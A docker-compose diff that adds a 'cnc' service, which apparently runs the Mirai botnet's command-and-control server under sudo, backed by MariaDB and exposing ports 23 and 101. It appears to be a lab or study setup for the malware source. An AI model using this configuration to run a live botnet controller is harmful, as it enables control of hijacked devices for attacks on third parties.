@@ -1,13 +1,11 @@
 version: "3.7"
 
 services:
+
     compile:
         build: compile
         volumes:
             - ./src:/home/user/src
-        ports:
-            - "23:23"
-            - "101:101"
 
     mariadb:
         image: mariadb:10.8.2-focal
@@ -20,3 +18,14 @@ services:
             - ./src/scripts/db.sql:/docker-entrypoint-initdb.d/init.sql:ro
         ports:
             - "3306:3306"
+
+    cnc:
+        build: compile
+        depends_on:
+            - mariadb
+        volumes:
+            - ./src:/home/user/src
+        ports:
+            - "23:23"
+            - "101:101"
+        command: "bash -c 'sudo ./src/mirai/debug/cnc'"
